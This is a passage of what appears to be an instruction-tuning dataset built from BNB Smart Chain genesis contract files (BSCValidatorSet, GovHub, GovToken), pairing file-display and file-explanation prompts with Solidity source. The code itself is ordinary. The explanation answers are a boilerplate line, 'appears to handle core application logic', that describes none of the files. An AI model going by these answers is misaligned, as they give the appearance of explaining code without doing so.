/**\n     * @dev Enter maintenance for current validators. refer to https://github.com/bnb-chain/BEPs/blob/master/BEP127.md\n     */\n    function enterMaintenance() external initValidatorExtraSet {\n        // check maintain config\n        if (maxNumOfMaintaining == 0) {\n            maxNumOfMaintaining = INIT_MAX_NUM_OF_MAINTAINING;\n        }\n        if (maintainSlashScale == 0) {\n            maintainSlashScale = INIT_MAINTAIN_SLASH_SCALE;\n        }\n\n        uint256 index = getCurrentValidatorIndex(msg.sender);\n        require(canEnterMaintenance(index), \"can not enter Temporary Maintenance\");\n        _enterMaintenance(msg.sender, index);\n    }\n\n    /**\n     * @dev Exit maintenance for current validators. refer to https://github.com/bnb-chain/BEPs/blob/master/BEP127.md\n     */\n    function exitMaintenance() external {\n        uint256 index = getCurrentValidatorIndex(msg.sender);\n\n        // jailed validators are allowed to exit maintenance\n        require(validatorExtraSet[index].isMaintaining, \"not in maintenance\");\n        uint256 miningValidatorCount = getWorkingValidatorCount();\n        _exitMaintenance(msg.sender, index, miningValidatorCount, true);\n    }\n\n    /*----------------- Param update -----------------*/\n    function updateParam(string calldata key, bytes calldata value) external override onlyInit onlyGov {\n        if (Memory.compareStrings(key, \"burnRatio\")) {\n            require(value.length == 32, \"length of burnRatio mismatch\");\n            uint256 newBurnRatio = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newBurnRatio.add(systemRewardBaseRatio).add(systemRewardAntiMEVRatio) <= BLOCK_FEES_RATIO_SCALE,\n                \"the burnRatio plus systemRewardBaseRatio and systemRewardAntiMEVRatio must be no greater than 10000\"\n            );\n            burnRatio = newBurnRatio;\n        } else if (Memory.compareStrings(key, \"maxNumOfMaintaining\")) {\n            require(value.length == 32, \"length of maxNumOfMaintaining mismatch\");\n            uint256 newMaxNumOfMaintaining = BytesToTypes.bytesToUint256(32, value);\n            uint256 _numOfCabinets = numOfCabinets;\n            if (_numOfCabinets == 0) {\n                _numOfCabinets = INIT_NUM_OF_CABINETS;\n            }\n            require(newMaxNumOfMaintaining < _numOfCabinets, \"the maxNumOfMaintaining must be less than numOfCabinets\");\n            maxNumOfMaintaining = newMaxNumOfMaintaining;\n        } else if (Memory.compareStrings(key, \"maintainSlashScale\")) {\n            require(value.length == 32, \"length of maintainSlashScale mismatch\");\n            uint256 newMaintainSlashScale = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newMaintainSlashScale > 0 && newMaintainSlashScale < 10,\n                \"the maintainSlashScale must be greater than 0 and less than 10\"\n            );\n            maintainSlashScale = newMaintainSlashScale;\n        } else if (Memory.compareStrings(key, \"maxNumOfWorkingCandidates\")) {\n            require(value.length == 32, \"length of maxNumOfWorkingCandidates mismatch\");\n            uint256 newMaxNumOfWorkingCandidates = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newMaxNumOfWorkingCandidates <= maxNumOfCandidates,\n                \"the maxNumOfWorkingCandidates must be not greater than maxNumOfCandidates\"\n            );\n            maxNumOfWorkingCandidates = newMaxNumOfWorkingCandidates;\n        } else if (Memory.compareStrings(key, \"maxNumOfCandidates\")) {\n            require(value.length == 32, \"length of maxNumOfCandidates mismatch\");\n            uint256 newMaxNumOfCandidates = BytesToTypes.bytesToUint256(32, value);\n            maxNumOfCandidates = newMaxNumOfCandidates;\n            if (maxNumOfWorkingCandidates > maxNumOfCandidates) {\n                maxNumOfWorkingCandidates = maxNumOfCandidates;\n            }\n        } else if (Memory.compareStrings(key, \"numOfCabinets\")) {\n            require(value.length == 32, \"length of numOfCabinets mismatch\");\n            uint256 newNumOfCabinets = BytesToTypes.bytesToUint256(32, value);\n            require(newNumOfCabinets > 0, \"the numOfCabinets must be greater than 0\");\n\n            uint256 maxElectedValidators = IStakeHub(STAKE_HUB_ADDR).maxElectedValidators();\n            require(\n                newNumOfCabinets <= maxElectedValidators, \"the numOfCabinets must be less than maxElectedValidators\"\n            );\n\n            numOfCabinets = newNumOfCabinets;\n        } else if (Memory.compareStrings(key, \"systemRewardBaseRatio\")) {\n            require(value.length == 32, \"length of systemRewardBaseRatio mismatch\");\n            uint256 newSystemRewardBaseRatio = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newSystemRewardBaseRatio.add(burnRatio).add(systemRewardAntiMEVRatio) <= BLOCK_FEES_RATIO_SCALE,\n                \"the systemRewardBaseRatio plus burnRatio and systemRewardAntiMEVRatio must be no greater than 10000\"\n            );\n            systemRewardBaseRatio = newSystemRewardBaseRatio;\n        } else if (Memory.compareStrings(key, \"systemRewardAntiMEVRatio\")) {\n            require(value.length == 32, \"length of systemRewardAntiMEVRatio mismatch\");\n            uint256 newSystemRewardAntiMEVRatio = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newSystemRewardAntiMEVRatio.add(burnRatio).add(systemRewardBaseRatio) <= BLOCK_FEES_RATIO_SCALE,\n                \"the systemRewardAntiMEVRatio plus burnRatio and systemRewardBaseRatio must be no greater than 10000\"\n            );\n            systemRewardAntiMEVRatio = newSystemRewardAntiMEVRatio;\n        } else if (Memory.compareStrings(key, \"turnLength\")) {\n            require(value.length == 32, \"length of turnLength mismatch\");\n            uint256 newTurnLength = BytesToTypes.bytesToUint256(32, value);\n            require(\n                newTurnLength >= 3 && newTurnLength <= 64 || newTurnLength == 1,\n                \"the turnLength should be in [3,64] or equal to 1\"\n            );\n            turnLength = newTurnLength;\n        } else {\n            require(false, \"unknown param\");\n        }\n        emit paramChange(key, value);\n    }\n\n    /*----------------- Internal Functions -----------------*/\n    function doUpdateState(Validator[] memory newValidatorSet, bytes[] memory newVoteAddrs) private {\n        uint256 n = currentValidatorSet.length;\n        uint256 m = newValidatorSet.length;\n\n        // delete stale validators\n        for (uint256 i; i < n; ++i) {\n            bool stale = true;\n            Validator memory oldValidator = currentValidatorSet[i];\n            for (uint256 j; j < m; ++j) {\n                if (oldValidator.consensusAddress == newValidatorSet[j].consensusAddress) {\n                    stale = false;\n                    break;\n                }\n            }\n            if (stale) {\n                delete currentValidatorSetMap[oldValidator.consensusAddress];\n            }\n        }\n\n        // if old validator set is larger than new validator set, pop the extra validators\n        if (n > m) {\n            for (uint256 i = m; i < n; ++i) {\n                currentValidatorSet.pop();\n                validatorExtraSet.pop();\n            }\n        }\n\n        uint256 k = n < m ? n : m;\n        for (uint256 i; i < k; ++i) {\n            // if the validator is not the same, update the validator set directly\n            if (!isSameValidator(newValidatorSet[i], currentValidatorSet[i])) {\n                currentValidatorSetMap[newValidatorSet[i].consensusAddress] = i + 1;\n                currentValidatorSet[i] = newValidatorSet[i];\n                validatorExtraSet[i].voteAddress = newVoteAddrs[i];\n                validatorExtraSet[i].isMaintaining = false;\n                validatorExtraSet[i].enterMaintenanceHeight = 0;\n            } else {\n                currentValidatorSet[i].votingPower = newValidatorSet[i].votingPower;\n                // update the vote address if it is different\n                if (!BytesLib.equal(newVoteAddrs[i], validatorExtraSet[i].voteAddress)) {\n                    validatorExtraSet[i].voteAddress = newVoteAddrs[i];\n                }\n            }\n        }\n\n        if (m > n) {\n            ValidatorExtra memory _validatorExtra;\n            for (uint256 i = n; i < m; ++i) {\n                _validatorExtra.voteAddress = newVoteAddrs[i];\n                currentValidatorSet.push(newValidatorSet[i]);\n                validatorExtraSet.push(_validatorExtra);\n                currentValidatorSetMap[newValidatorSet[i].consensusAddress] = i + 1;\n            }\n        }\n\n        // update vote addr full set\n        setPreviousVoteAddrFullSet();\n        setCurrentVoteAddrFullSet();\n\n        // make sure all new validators are cleared maintainInfo\n        // should not happen, still protect\n        numOfMaintaining = 0;\n        n = currentValidatorSet.length;\n        for (uint256 i; i < n; ++i) {\n            validatorExtraSet[i].isMaintaining = false;\n            validatorExtraSet[i].enterMaintenanceHeight = 0;\n        }\n    }\n\n    /**\n     * @dev With each shuffle interval blocks, there will be a partial rotation between cabinets and candidates. Rotation is determined by this function\n     */\n    function shuffle(\n        address[] memory validators,\n        bytes[] memory voteAddrs,\n        uint256 shuffleNumber,\n        uint256 startIdx,\n        uint256 offset,\n        uint256 limit,\n        uint256 modNumber\n    ) internal pure {\n        for (uint256 i; i < limit; ++i) {\n            uint256 random = uint256(keccak256(abi.encodePacked(shuffleNumber, startIdx + i))) % modNumber;\n            if ((startIdx + i) != (offset + random)) {\n                address tmpAddr = validators[startIdx + i];\n                bytes memory tmpBLS = voteAddrs[startIdx + i];\n                validators[startIdx + i] = validators[offset + random];\n                validators[offset + random] = tmpAddr;\n                voteAddrs[startIdx + i] = voteAddrs[offset + random];\n                voteAddrs[offset + random] = tmpBLS;\n            }\n        }\n    }\n\n    /**\n     * @dev Check if two validators are the same\n     *\n     * Vote address is not considered\n     */\n    function isSameValidator(Validator memory v1, Validator memory v2) private pure returns (bool) {\n        return v1.consensusAddress == v2.consensusAddress && v1.feeAddress == v2.feeAddress\n            && v1.BBCFeeAddress == v2.BBCFeeAddress;\n    }\n\n    function getVoteAddresses(address[] memory validators) internal view returns (bytes[] memory) {\n        uint256 n = currentValidatorSet.length;\n        uint256 length = validators.length;\n        bytes[] memory voteAddrs = new bytes[](length);\n\n        // check if validatorExtraSet has been initialized\n        if (validatorExtraSet.length != n) {\n            return voteAddrs;\n        }\n\n        for (uint256 i; i < length; ++i) {\n            voteAddrs[i] = validatorExtraSet[currentValidatorSetMap[validators[i]] - 1].voteAddress;\n        }\n        return voteAddrs;\n    }\n\n    function getTurnLength() external view returns (uint256) {\n        if (turnLength == 0) {\n            return 1;\n        }\n        return turnLength;\n    }\n\n    function setPreviousVoteAddrFullSet() private {\n        uint256 n = previousVoteAddrFullSet.length;\n        uint256 m = currentVoteAddrFullSet.length;\n\n        if (n > m) {\n            for (uint256 i = m; i < n; ++i) {\n                previousVoteAddrFullSet.pop();\n            }\n        }\n\n        uint256 k = n < m ? n : m;\n        for (uint256 i; i < k; ++i) {\n            if (!BytesLib.equal(previousVoteAddrFullSet[i], currentVoteAddrFullSet[i])) {\n                previousVoteAddrFullSet[i] = currentVoteAddrFullSet[i];\n            }\n        }\n\n        if (m > n) {\n            for (uint256 i = n; i < m; ++i) {\n                previousVoteAddrFullSet.push(currentVoteAddrFullSet[i]);\n            }\n        }\n    }\n\n    function setCurrentVoteAddrFullSet() private {\n        uint256 n = currentVoteAddrFullSet.length;\n        uint256 m = validatorExtraSet.length;\n\n        if (n > m) {\n            for (uint256 i = m; i < n; ++i) {\n                currentVoteAddrFullSet.pop();\n            }\n        }\n\n        uint256 k = n < m ? n : m;\n        for (uint256 i; i < k; ++i) {\n            if (!BytesLib.equal(currentVoteAddrFullSet[i], validatorExtraSet[i].voteAddress)) {\n                currentVoteAddrFullSet[i] = validatorExtraSet[i].voteAddress;\n            }\n        }\n\n        if (m > n) {\n            for (uint256 i = n; i < m; ++i) {\n                currentVoteAddrFullSet.push(validatorExtraSet[i].voteAddress);\n            }\n        }\n    }\n\n    function isMonitoredForMaliciousVote(bytes calldata voteAddr) external view override returns (bool) {\n        uint256 m = currentVoteAddrFullSet.length;\n        for (uint256 i; i < m; ++i) {\n            if (BytesLib.equal(voteAddr, currentVoteAddrFullSet[i])) {\n                return true;\n            }\n        }\n\n        uint256 n = previousVoteAddrFullSet.length;\n        for (uint256 i; i < n; ++i) {\n            if (BytesLib.equal(voteAddr, previousVoteAddrFullSet[i])) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    function _misdemeanor(address validator) private returns (uint256) {\n        uint256 index = currentValidatorSetMap[validator];\n        if (index <= 0) {\n            return ~uint256(0);\n        }\n        // the actually index\n        index = index - 1;\n\n        uint256 income = currentValidatorSet[index].incoming;\n        currentValidatorSet[index].incoming = 0;\n        uint256 rest = currentValidatorSet.length - 1;\n        emit validatorMisdemeanor(validator, income);\n        if (rest == 0) {\n            // should not happen, but still protect\n            return index;\n        }\n\n        // averageDistribute*rest may less than income, but it is ok, the dust income will go to system reward eventually.\n        uint256 averageDistribute = income / rest;\n        if (averageDistribute != 0) {\n            for (uint256 i; i < index; ++i) {\n                currentValidatorSet[i].incoming = currentValidatorSet[i].incoming.add(averageDistribute);\n            }\n            uint256 n = currentValidatorSet.length;\n            for (uint256 i = index + 1; i < n; ++i) {\n                currentValidatorSet[i].incoming = currentValidatorSet[i].incoming.add(averageDistribute);\n            }\n        }\n\n        return index;\n    }\n\n    function _felony(address validator, uint256 index) private returns (bool) {\n        uint256 income = currentValidatorSet[index].incoming;\n        uint256 rest = currentValidatorSet.length - 1;\n        if (getValidators().length <= 1) {\n            // will not remove the validator if it is the only one validator.\n            currentValidatorSet[index].incoming = 0;\n            return false;\n        }\n        emit validatorFelony(validator, income);\n\n        // remove the validator from currentValidatorSet\n        delete currentValidatorSetMap[validator];\n        // remove felony validator\n        for (uint256 i = index; i < (currentValidatorSet.length - 1); ++i) {\n            currentValidatorSet[i] = currentValidatorSet[i + 1];\n            validatorExtraSet[i] = validatorExtraSet[i + 1];\n            currentValidatorSetMap[currentValidatorSet[i].consensusAddress] = i + 1;\n        }\n        currentValidatorSet.pop();\n        validatorExtraSet.pop();\n\n        // averageDistribute*rest may less than income, but it is ok, the dust income will go to system reward eventually.\n        uint256 averageDistribute = income / rest;\n        if (averageDistribute != 0) {\n            uint256 n = currentValidatorSet.length;\n            for (uint256 i; i < n; ++i) {\n                currentValidatorSet[i].incoming = currentValidatorSet[i].incoming.add(averageDistribute);\n            }\n        }\n        return true;\n    }\n\n    function _forceMaintainingValidatorsExit(\n        Validator[] memory _validatorSet,\n        bytes[] memory _voteAddrs\n    ) private returns (Validator[] memory unjailedValidatorSet, bytes[] memory unjailedVoteAddrs) {\n        uint256 numOfFelony = 0;\n        address validator;\n        bool isFelony;\n\n        // 1. validators exit maintenance\n        uint256 i;\n        // caution: it must calculate miningValidatorCount before _exitMaintenance loop\n        // because the miningValidatorCount will be changed in _exitMaintenance\n        uint256 miningValidatorCount = getWorkingValidatorCount();\n        // caution: it must loop from the endIndex to startIndex in currentValidatorSet\n        // because the validators order in currentValidatorSet may be changed by _felony(validator)\n        for (uint256 index = currentValidatorSet.length; index > 0; --index) {\n            i = index - 1; // the actual index\n            if (!validatorExtraSet[i].isMaintaining) {\n                continue;\n            }\n\n            // only maintaining validators\n            validator = currentValidatorSet[i].consensusAddress;\n\n            // exit maintenance\n            isFelony = _exitMaintenance(validator, i, miningValidatorCount, false);\n            if (!isFelony) {\n                continue;\n            }\n\n            // get the latest consensus address\n            address latestConsensusAddress;\n            address operatorAddress = IStakeHub(STAKE_HUB_ADDR).consensusToOperator(validator);\n            if (operatorAddress != address(0)) {\n                latestConsensusAddress = IStakeHub(STAKE_HUB_ADDR).getValidatorConsensusAddress(operatorAddress);\n            }\n\n            // record the jailed validator in validatorSet\n            for (uint256 j; j < _validatorSet.length; ++j) {\n                if (\n                    _validatorSet[j].consensusAddress == validator\n                        || _validatorSet[j].consensusAddress == latestConsensusAddress\n                ) {\n                    _validatorSet[j].jailed = true;\n                    break;\n                }\n            }\n        }\n\n        // count the number of felony validators\n        for (uint256 k; k < _validatorSet.length; ++k) {\n            if (_validatorSet[k].jailed || _validatorSet[k].consensusAddress == address(0)) {\n                ++numOfFelony;\n            }\n        }\n\n        // 2. get unjailed validators from validatorSet\n        if (numOfFelony >= _validatorSet.length) {\n            // make sure there is at least one validator\n            unjailedValidatorSet = new Validator[](1);\n            unjailedVoteAddrs = new bytes[](1);\n            unjailedValidatorSet[0] = _validatorSet[0];\n            unjailedVoteAddrs[0] = _voteAddrs[0];\n            unjailedValidatorSet[0].jailed = false;\n        } else {\n            unjailedValidatorSet = new Validator[](_validatorSet.length - numOfFelony);\n            unjailedVoteAddrs = new bytes[](_validatorSet.length - numOfFelony);\n            i = 0;\n            for (uint256 index; index < _validatorSet.length; ++index) {\n                if (!_validatorSet[index].jailed && _validatorSet[index].consensusAddress != address(0)) {\n                    unjailedValidatorSet[i] = _validatorSet[index];\n                    unjailedVoteAddrs[i] = _voteAddrs[index];\n                    ++i;\n                }\n            }\n        }\n\n        return (unjailedValidatorSet, unjailedVoteAddrs);\n    }\n\n    function _enterMaintenance(address validator, uint256 index) private {\n        ++numOfMaintaining;\n        validatorExtraSet[index].isMaintaining = true;\n        validatorExtraSet[index].enterMaintenanceHeight = block.number;\n        emit validatorEnterMaintenance(validator);\n    }\n\n    function _exitMaintenance(\n        address validator,\n        uint256 index,\n        uint256 miningValidatorCount,\n        bool shouldRevert\n    ) private returns (bool isFelony) {\n        if (maintainSlashScale == 0 || miningValidatorCount == 0 || numOfMaintaining == 0) {\n            // should not happen, still protect\n            return false;\n        }\n\n        // step 0: modify numOfMaintaining\n        --numOfMaintaining;\n\n        // step 1: calculate slashCount\n        uint256 slashCount = block.number.sub(validatorExtraSet[index].enterMaintenanceHeight).div(miningValidatorCount)\n            .div(maintainSlashScale);\n\n        // step 2: clear isMaintaining info\n        validatorExtraSet[index].isMaintaining = false;\n\n        // step 3: slash the validator\n        (uint256 misdemeanorThreshold, uint256 felonyThreshold) =\n            ISlashIndicator(SLASH_CONTRACT_ADDR).getSlashThresholds();\n        isFelony = false;\n        if (slashCount >= felonyThreshold) {\n            _felony(validator, index);\n            ISlashIndicator(SLASH_CONTRACT_ADDR).downtimeSlash(validator, slashCount, shouldRevert);\n            isFelony = true;\n        } else if (slashCount >= misdemeanorThreshold) {\n            _misdemeanor(validator);\n        }\n\n        emit validatorExitMaintenance(validator);\n    }\n\n    function decodeValidatorSet(bytes memory msgBytes)\n        internal\n        pure\n        returns (ValidatorSetPackage memory, bool)\n    {\n        ValidatorSetPackage memory validatorSetPkg;\n\n        RLPDecode.Iterator memory iter = msgBytes.toRLPItem().iterator();\n        bool success = false;\n        uint256 idx = 0;\n        while (iter.hasNext()) {\n            if (idx == 0) {\n                validatorSetPkg.packageType = uint8(iter.next().toUint());\n            } else if (idx == 1) {\n                RLPDecode.RLPItem[] memory items = iter.next().toList();\n                validatorSetPkg.validatorSet = new Validator[](items.length);\n                validatorSetPkg.voteAddrs = new bytes[](items.length);\n                for (uint256 j; j < items.length; ++j) {\n                    (Validator memory val, bytes memory voteAddr, bool ok) = decodeValidator(items[j]);\n                    if (!ok) {\n                        return (validatorSetPkg, false);\n                    }\n                    validatorSetPkg.validatorSet[j] = val;\n                    validatorSetPkg.voteAddrs[j] = voteAddr;\n                }\n                success = true;\n            } else {\n                break;\n            }\n            ++idx;\n        }\n        return (validatorSetPkg, success);\n    }\n\n    function decodeValidator(RLPDecode.RLPItem memory itemValidator)\n        internal\n        pure\n        returns (Validator memory, bytes memory, bool)\n    {\n        Validator memory validator;\n        bytes memory voteAddr;\n        RLPDecode.Iterator memory iter = itemValidator.iterator();\n        bool success = false;\n        uint256 idx = 0;\n        while (iter.hasNext()) {\n            if (idx == 0) {\n                validator.consensusAddress = iter.next().toAddress();\n            } else if (idx == 1) {\n                validator.feeAddress = address(uint160(iter.next().toAddress()));\n            } else if (idx == 2) {\n                validator.BBCFeeAddress = iter.next().toAddress();\n            } else if (idx == 3) {\n                validator.votingPower = uint64(iter.next().toUint());\n                success = true;\n            } else if (idx == 4) {\n                voteAddr = iter.next().toBytes();\n            } else {\n                break;\n            }\n            ++idx;\n        }\n        return (validator, voteAddr, success);\n    }\n}\n\n```"}
{"instruction": "What does the file BSCValidatorSet.sol do?", "input": "```sol\npragma solidity 0.6.4;\npragma experimental ABIEncoderV2;\n\nimport \"./System.sol\";\nimport \"./lib/0.6.x/BytesLib.sol\";\nimport \"./lib/0.6.x/BytesToTypes.sol\";\nimport \"./lib/0.6.x/Memory.sol\";\nimport \"./interface/0.6.x/ISlashIndicator.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/IBSCValidatorSet.sol\";\nimport \"./interface/0.6.x/IApplication.sol\";\nimport \"./interface/0.6.x/IStakeHub.sol\";\nimport \"./lib/0.6.x/SafeMath.sol\";\nimport \"./lib/0.6.x/RLPDecode.sol\";\n\ncontract BSCValidatorSet is IBSCValidatorSet, System, IParamSubscriber, IApplication {\n    using SafeMath for uint256;\n\n    using RLPDecode for *;\n\n    bytes public constant INIT_VALIDATORSET_BYTES =\n        hex\"f905ec80f905e8f846942a7cdd959bfe8d9487b2a43b33565295a698f7e294b6a7edd747c0554875d3fc531d19ba1497992c5e941ff80f3f7f110ffd8920a3ac38fdef318fe94a3f86048c27395000f846946488aa4d1955ee33403f8ccb1d4de5fb97c7ade294220f003d8bdfaadf52aa1e55ae4cc485e6794875941a87e90e440a39c99aa9cb5cea0ad6a3f0b2407b86048c27395000f846949ef9f4360c606c7ab4db26b016007d3ad0ab86a0946103af86a874b705854033438383c82575f25bc29418e2db06cbff3e3c5f856410a1838649e760175786048c27395000f84694ee01c3b1283aa067c58eab4709f85e99d46de5fe94ee4b9bfb1871c64e2bcabb1dc382dc8b7c4218a29415904ab26ab0e99d70b51c220ccdcccabee6e29786048c27395000f84694685b1ded8013785d6623cc18d214320b6bb6475994a20ef4e5e4e7e36258dbf51f4d905114cb1b34bc9413e39085dc88704f4394d35209a02b1a9520320c86048c27395000f8469478f3adfc719c99674c072166708589033e2d9afe9448a30d5eaa7b64492a160f139e2da2800ec3834e94055838358c29edf4dcc1ba1985ad58aedbb6be2b86048c27395000f84694c2be4ec20253b8642161bc3f444f53679c1f3d479466f50c616d737e60d7ca6311ff0d9c434197898a94d1d678a2506eeaa365056fe565df8bc8659f28b086048c27395000f846942f7be8361c80a4c1e7e9aaf001d0877f1cfde218945f93992ac37f3e61db2ef8a587a436a161fd210b94ecbc4fb1a97861344dad0867ca3cba2b860411f086048c27395000f84694ce2fd7544e0b2cc94692d4a704debef7bcb613289444abc67b4b2fba283c582387f54c9cba7c34bafa948acc2ab395ded08bb75ce85bf0f95ad2abc51ad\n```", "output": "This file `BSCValidatorSet.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for GovHub.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\GovHub.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"./System.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/IApplication.sol\";\n\ncontract GovHub is System, IApplication {\n    uint32 public constant ERROR_TARGET_NOT_CONTRACT = 101;\n    uint32 public constant ERROR_TARGET_CONTRACT_FAIL = 102;\n\n    event failReasonWithStr(string message);\n    event failReasonWithBytes(bytes message);\n    event paramChange(string key, bytes value);  // @dev deprecated\n\n    struct ParamChangePackage {\n        string key;\n        bytes value;\n        address target;\n    }\n\n    function handleSynPackage(\n        uint8,\n        bytes calldata msgBytes\n    ) external override onlyCrossChainContract returns (bytes memory responsePayload) {\n        revert(\"deprecated\");\n    }\n\n    // should not happen\n    function handleAckPackage(uint8, bytes calldata) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    // should not happen\n    function handleFailAckPackage(uint8, bytes calldata) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    function updateParam(string calldata key, bytes calldata value, address target) external onlyGovernorTimelock {\n        ParamChangePackage memory proposal = ParamChangePackage(key, value, target);\n        notifyUpdates(proposal);\n    }\n\n    function notifyUpdates(ParamChangePackage memory proposal) internal returns (uint32) {\n        if (!isContract(proposal.target)) {\n            emit failReasonWithStr(\"the target is not a contract\");\n            return ERROR_TARGET_NOT_CONTRACT;\n        }\n        try IParamSubscriber(proposal.target).updateParam(proposal.key, proposal.value) { }\n        catch Error(string memory reason) {\n            emit failReasonWithStr(reason);\n            return ERROR_TARGET_CONTRACT_FAIL;\n        } catch (bytes memory lowLevelData) {\n            emit failReasonWithBytes(lowLevelData);\n            return ERROR_TARGET_CONTRACT_FAIL;\n        }\n        return CODE_OK;\n    }\n}\n\n```"}
{"instruction": "What does the file GovHub.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"./System.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/IApplication.sol\";\n\ncontract GovHub is System, IApplication {\n    uint32 public constant ERROR_TARGET_NOT_CONTRACT = 101;\n    uint32 public constant ERROR_TARGET_CONTRACT_FAIL = 102;\n\n    event failReasonWithStr(string message);\n    event failReasonWithBytes(bytes message);\n    event paramChange(string key, bytes value);  // @dev deprecated\n\n    struct ParamChangePackage {\n        string key;\n        bytes value;\n        address target;\n    }\n\n    function handleSynPackage(\n        uint8,\n        bytes calldata msgBytes\n    ) external override onlyCrossChainContract returns (bytes memory responsePayload) {\n        revert(\"deprecated\");\n    }\n\n    // should not happen\n    function handleAckPackage(uint8, bytes calldata) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    // should not happen\n    function handleFailAckPackage(uint8, bytes calldata) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    function updateParam(string calldata key, bytes calldata value, address target) external onlyGovernorTimelock {\n        ParamChangePackage memory proposal = ParamChangePackage(key, value, target);\n        notifyUpdates(proposal);\n    }\n\n    function notifyUpdates(ParamChangePackage memory proposal) internal returns (uint32) {\n        if (!isContract(proposal.target)) {\n            emit failReasonWithStr(\"the target is not a contract\");\n            return ERROR_TARGET_NOT_CONTRACT;\n        }\n        try IParamSubscriber(proposal.target).updateParam(proposal.key, proposal.value) { }\n        catch Error(string memory reason) {\n            emit failReasonWithStr(reason);\n            return ERROR_TARGET_CONTRACT_FAIL;\n        } catch (bytes memory lowLevelData) {\n            emit failReasonWithBytes(lowLevelData);\n            return ERROR_TARGET_CONTRACT_FAIL;\n        }\n        return CODE_OK;\n \n```", "output": "This file `GovHub.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for GovToken.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\GovToken.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20BurnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PermitUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20VotesUpgradeable.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./interface/0.8.x/IStakeCredit.sol\";\n\ncontract GovToken is\n    SystemV2,\n    Initializable,\n    ERC20Upgradeable,\n    ERC20BurnableUpgradeable,\n    ERC20PermitUpgradeable,\n    ERC20VotesUpgradeable\n{\n    /*----------------- constants -----------------*/\n    string private constant NAME = \"BSC Governance Token\";\n    string private constant SYMBOL = \"govBNB\";\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x8cd22d19\n    error TransferNotAllowed();\n    // @notice signature: 0x20287471\n    error ApproveNotAllowed();\n    // @notice signature: 0xe5d87767\n    error BurnNotAllowed();\n\n    /*----------------- storage -----------------*/\n    // validator StakeCredit contract => user => amount\n    mapping(address => mapping(address => uint256)) public mintedMap;\n\n    /*----------------- init -----------------*/\n    function initialize() public initializer onlyCoinbase onlyZeroGasPrice {\n        __ERC20_init(NAME, SYMBOL);\n        __ERC20Burnable_init();\n        __ERC20Permit_init(NAME);\n        __ERC20Votes_init();\n    }\n\n    /*----------------- external functions -----------------*/\n    /**\n     * @dev Sync the account's govBNB amount to the actual BNB value of the StakingCredit he holds\n     * @param stakeCredit the stakeCredit Token contract\n     * @param account the account to sync gov tokens to\n     */\n    function sync(address stakeCredit, address account) external onlyStakeHub {\n        _sync(stakeCredit, account);\n    }\n\n    /**\n     * @dev Batch sync the account's govBNB amount to the actual BNB value of the StakingCredit he holds\n     * @param stakeCredits the stakeCredit Token contracts\n     * @param account the account to sync gov tokens to\n     */\n    function syncBatch(address[] calldata stakeCredits, address account) external onlyStakeHub {\n        uint256 _length = stakeCredits.length;\n        for (uint256 i = 0; i < _length; ++i) {\n            _sync(stakeCredits[i], account);\n        }\n    }\n\n    /**\n     * @dev delegate govBNB votes to delegatee\n     * @param delegator the delegator\n     * @param delegatee the delegatee\n     */\n    function delegateVote(address delegator, address delegatee) external onlyStakeHub {\n        _delegate(delegator, delegatee);\n    }\n\n    function burn(\n        uint256\n    ) public pure override {\n        revert BurnNotAllowed();\n    }\n\n    function burnFrom(address, uint256) public pure override {\n        revert BurnNotAllowed();\n    }\n\n    /*----------------- internal functions -----------------*/\n    function _sync(address stakeCredit, address account) internal {\n        uint256 latestBNBAmount = IStakeCredit(stakeCredit).getPooledBNB(account);\n        uint256 _mintedAmount = mintedMap[stakeCredit][account];\n\n        if (_mintedAmount < latestBNBAmount) {\n            uint256 _needMint = latestBNBAmount - _mintedAmount;\n            mintedMap[stakeCredit][account] = latestBNBAmount;\n            _mint(account, _needMint);\n        } else if (_mintedAmount > latestBNBAmount) {\n            uint256 _needBurn = _mintedAmount - latestBNBAmount;\n            mintedMap[stakeCredit][account] = latestBNBAmount;\n            _burn(account, _needBurn);\n        }\n    }\n\n    function _transfer(address, address, uint256) internal pure override {\n        revert TransferNotAllowed();\n    }\n\n    function _approve(address, address, uint256) internal pure override {\n        revert ApproveNotAllowed();\n    }\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal override(ERC20Upgradeable, ERC20VotesUpgradeable) {\n        ERC20VotesUpgradeable._afterTokenTransfer(from, to, amount);\n    }\n\n    function _mint(address to, uint256 amount) internal override(ERC20Upgradeable, ERC20VotesUpgradeable) {\n        ERC20VotesUpgradeable._mint(to, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal override(ERC20Upgradeable, ERC20VotesUpgradeable) {\n        ERC20VotesUpgradeable._burn(account, amount);\n    }\n}\n\n```"}
